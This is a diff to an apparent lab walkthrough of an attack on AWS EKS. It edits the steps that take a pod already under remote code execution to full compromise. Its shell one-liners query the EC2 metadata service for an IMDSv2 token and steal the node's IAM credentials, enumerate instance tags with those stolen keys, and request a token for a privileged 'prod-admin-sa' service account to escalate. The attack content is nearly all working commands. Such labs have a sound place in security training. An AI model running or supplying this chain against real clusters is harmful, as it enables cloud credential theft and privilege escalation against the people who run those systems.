@@ -14,27 +14,20 @@ Status: Remote code execution inside the pod (as `appuser`)
 
 ---
 
-### Step 2 — Get IMDSv2 Token
+### Step 2 — Get IAM Role Name via IMDSv2
 
 ```bash
-; TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
-    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && echo $TOKEN
+; curl -s -H "X-aws-ec2-metadata-token: $(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')" http://169.254.169.254/latest/meta-data/iam/security-credentials/
 ```
 
-Status: IMDSv2 session token (hop limit = 2 is commonly configured on EKS nodes)
+Status: Lists IAM role attached to the EC2 node (e.g. `eks-attacks-lab-node-role`)
 
 ---
 
 ### Step 3 — Steal EC2 Node IAM Credentials
 
 ```bash
-# Get role name
-; curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
-    http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# Get credentials
-; curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
-    http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
+; curl -s -H "X-aws-ec2-metadata-token: $(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
 ```
 
 Status: AWS AccessKeyId, SecretAccessKey, and Session Token for the EC2 node
@@ -45,10 +38,9 @@ Status: AWS AccessKeyId, SecretAccessKey, and Session Token for the EC2 node
 
 ```bash
 # Instance ID (from RCE)
-; curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
-    http://169.254.169.254/latest/meta-data/instance-id
+; curl -s -H "X-aws-ec2-metadata-token: $(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')" http://169.254.169.254/latest/meta-data/instance-id
 
-# EC2 tags (from attacker machine with stolen creds)
+# EC2 tags (run from attacker laptop with the stolen credentials from Step 3)
 aws ec2 describe-tags --filters "Name=resource-id,Values=<INSTANCE_ID>" --output table
 ```
 
@@ -136,10 +128,7 @@ Status: Got the bound-object UID needed for token request
 ### Step 11 — Request Service Account Token (the escalation)
 
 ```bash
-SA_TOKEN=$(kubectl create token prod-admin-sa -n prod \
-  --bound-object-kind=Pod \
-  --bound-object-name=payment-processor \
-  --bound-object-uid="$POD_UID")
+SA_TOKEN=$(kubectl create token prod-admin-sa -n prod --bound-object-kind=Pod --bound-object-name=payment-processor --bound-object-uid="$POD_UID")
 ```
 
 Status: NodeRestriction allows this — node can request tokens for any pod on itself
